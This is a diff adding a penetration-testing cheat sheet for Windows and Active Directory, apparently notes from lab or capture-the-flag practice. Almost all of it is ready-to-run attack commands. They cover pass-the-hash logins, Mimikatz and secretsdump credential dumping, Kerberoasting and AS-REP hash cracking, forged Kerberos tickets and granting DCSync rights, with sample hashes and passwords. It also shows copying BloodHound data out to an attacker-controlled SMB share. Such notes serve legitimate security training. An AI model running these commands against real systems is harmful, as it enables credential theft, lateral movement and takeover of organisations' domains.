@@ -1,0 +1,168 @@
+## Windows Specifics
+### Connect, Pivot, Elevate:  
+
+    Connect via Creds:
+        Port 22: SSH
+        Port 23: Telnet
+        Port 135/445:
+            PsExec.exe domain/user@IP  \\  python3 psexec.py domain/user@IP
+            python3 smbexec.py domain/user@IP
+            wmiexec.exe domain/user@IP  \\  python3 wmiexec.py domain/user@IP
+            winexe -U <domain/username>%<password> //<targetIP> cmd.exe
+        Port 3389: RDP
+              rdesktop [-d <DOMAIN>] -u <USERNAME> [-p <PASS>] <IP>  \\  xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP> +clipboard
+        Port 5985/5986: winRM
+            ruby evil-winrm.rb -i 10.0.0.20 -u user -p PASS
+
+    Connect via Pass the Hash:
+        https://blog.ropnop.com/practical-usage-of-ntlm-hashes/
+        RPC:
+            Show Endpoints:  python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
+            Connect:  pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105
+        Port 135/445:
+            PSExec:  python3 psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
+                MSF:  use exploit/windows/smb/psexec  \\  use admin/smb/psexec_command (stealthier)
+                If STATUS_ACCESS_DENIED (Command=117 WordCount=0):  set “HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” RequireSecuritySignature to ‘0’
+            *PTH-Winexe:  pth-winexe -U [domain/]offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd.exe
+                Only replace after the ':'
+            PTH-wmic:  pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"
+            WMIExec:  python3 wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79  \\  sudo python3 wmiexec.py -hashes :f6084ca1a4905c45747d4bdcc1fcab84 daisy@10.11.1.122
+            *CrackMapExec:  crackmapexec smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79 -d domain.local [-x ipconfig]  \\  sudo crackmapexec ldap 10.11.1.120/29 -u daisy -H f6084ca1a4905c45747d4bdcc1fcab84
+            SMBClient:  smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local  \\  python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105  \\  pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
+            ATExec:  python3 atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 cmd.exe
+        Port 3389 (Windows 2012 R2, 8.1):
+            xfreerdp /u:offsec /d:win2012 /pth:2892d26cdf84d7a70e2eb3b9f05c425e /v:192.168.2.102
+            Might need to enable first:  crackmapexec smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+        Port 5985/5986:
+            ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
+        Through Kerberos Ticket:
+            Create TGT:  python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user; cp user.ccache /tmp/krb5cc_0; export KRB5CCNAME=/tmp/krb5cc_0
+            SSH connect:  ssh -o GSSAPIAuthentication=yes user@domain.local -vv; cp user.ccache /tmp/krb5cc_1045; ssh -o GSSAPIAuthentication=yes user@domain.local
+        From Windows:
+            Mimikatz:  privilege::debug; sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38 [/run:powershell.exe]
+            Powershell:  Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
+            CMD:  wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
+    Other PTH Techniques:
+        Read/Modify Registry:
+            python3 reg.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
+        Enum Users:  python3 lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105  \\  python3 samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
+
+    Other Credential Methods:
+        UAC Bypass:  https://github.com/k4sth4/UAC-bypass
+        Impersonation/elevation:  runas /user:domain\username cmd.exe
+        Powershell Invoke-Command:
+            With creds, running powershell as a user (using a credential object and invoke-command) (ex. https://0xdf.gitlab.io/2020/04/25/htb-control.html)
+            $password=ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force
+            $cred=New-Object System.Management.Automation.PSCredential("username",$password)
+            Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock { Get-Culture }
+        Enumeration:
+            Secretsdump:
+                python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm egotisticalbank/svc_loanmgr@10.10.10.175
+                With Creds/Hash:
+                    python3 secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+                    python3 secretsdump.py svc-alfresco:s3rvice@10.10.10.161  
+  
+### Active Directory:
+  
+      Enumeration:
+          net user
+          net user /domain
+          net user jeff_admin /domain  -> check groups
+          net group /domain
+        
+        Modern approach using LDAP://HostName[:PortNumber][/DistinguishedName]:
+        hostname: in PS:  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+        **PS Script that collects all users and their attributes:
+            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $PDC = ($domainObj.PdcRoleOwner).Name
+            $SearchString = "LDAP://"
+            $SearchString += $PDC + "/"
+            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+            $SearchString += $DistinguishedName
+            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+            $Searcher.SearchRoot = $objDomain
+            $Searcher.filter="samAccountType=805306368"
+            $Result = $Searcher.FindAll()
+            Foreach($obj in $Result)
+            {
+             Foreach($prop in $obj.Properties)
+             {
+             $prop
+             }
+
+             Write-Host "------------------------"
+            }
+        Resolving Nested Groups:
+            to list groups, change last lines of script to:
+            $Searcher.SearchRoot = $objDomain
+            $Searcher.filter="(objectClass=Group)"
+            $Result = $Searcher.FindAll()
+            Foreach($obj in $Result)
+            {
+             $obj.Properties.name
+            }
+            to list members in a group, change to $Searcher.filter="(name=Secret_Group)"    and  $obj.Properties.member
+        Currently Logged on Users:
+            Import-Module .\PowerView.ps1
+             Get-NetLoggedon -ComputerName client123
+            DC sessions:  Get-NetSession -ComputerName dc01
+        Enumeration through Service Principal Names:
+            ex. looking for web servers, update script:  $Searcher.filter="serviceprincipalname=*http*"
+                 nslookup CorpWebServer.corp.com
+    Lateral Movement:
+        Pass the Hash for NTLM
+        Overpass the Hash to get kerberos ticket
+        Pass the Ticket
+        Distributed Component Object Model (DCOM)
+    Persistence:
+        Golden Tickets
+        Domain Controller Synchronization
+
+    Active Directory Recon/Connecting:
+        especially for domain controllers with smb, ldap, kerberos, etc.:  enum4linux 10.10.10.161  (gets usernames)
+        ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.10
+        rpcclient -U "" -N 10.10.10.161
+          enumdomusers
+          enumdomgroups
+          querygroup 0x200 (see admin group members)
+            querygroupmem 0x200
+              queryuser 0x1f4
+          querydispinfo
+        (checking if username exists) Try to get user hashes, use GetNPUsers.py: for user in $(cat users); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.193 fabricorp.local/${user} | grep -v Impacket; done
+          crack hash: hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
+          Then connect with evil-winrm--try password and hash
+
+    Decrypting cpassword/GPP with gpp-decrypt:  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+      then:  smbclient //10.10.10.100/Users -U SVC_TGS
+      After getting user creds, then do Kerberoasting if ports are there (https://0xrick.github.io/hack-the-box/active/)
+        1. add domain to /etc/hosts
+        2. get admin Kerberos ticket:  python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request active.htb/SVC_TGS
+        3. crack:  ./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
+        4. connect:  python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@active.htb
+
+    Active Directory Recon/Suggestions with BloodHound:
+      Run SharpHound.exe on victim to get data, then analyze it locally with BloodHound
+        File transfer back to Kali with: python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username df -password df  on Kali
+          victim:  net use \\10.10.14.18\share /u:df df,  copy 20191018035324_BloodHound.zip \\10.10.14.18\share\,  net use /d \\10.10.14.18\share
+      Run BloodHound on kali:  first:  neo4j console    then:  set up password in http://localhost:7474/browser/  then:  ./BloodHound --no-sandbox
+        drag zip sharphound file into window
+        See groups and path to admin.
+        Account Operators lets us create a new account and add to most groups.
+        add to a group:  net group "Exchange Windows Permissions" svc-alfresco /add /domain
+        Transfer PowerView.ps1 file to get the commands
+        One liner ex.:   Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+          member of, write-dacl
+
+    Kerberos Attacks:
+        https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+        Get Known User TGTs:  python GetNPUsers.py -dc-ip 192.168.1.105 ignite.local/ -usersfile users -format john -outputfile hashes
+            All Users (creds req):  python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+            Crack:  john --wordlist=/usr/share/wordlists/rockyou.txt hashes  \\  hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
+        Get Service Principal Names:  python GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika  \\  python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  \\  .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
+            Crack:  john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>  \\  hashcat -m 13100 --force <TGSs_file> <passwords_file>
+        Create Ticket:  python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj
+        Convert kirbi/ccache ticket:  python ticketConverter.py raj.ccache ticket.kirbi
+        Request TGT:  python getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 ignite.local/yashika
+            Get Shell:  export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local
+        Dump AD User info:  python3 GetADUSers.py [-all \\ -all-users] ignite.local/Administrator:Ignite@987 -dc-ip 192.168.1.105
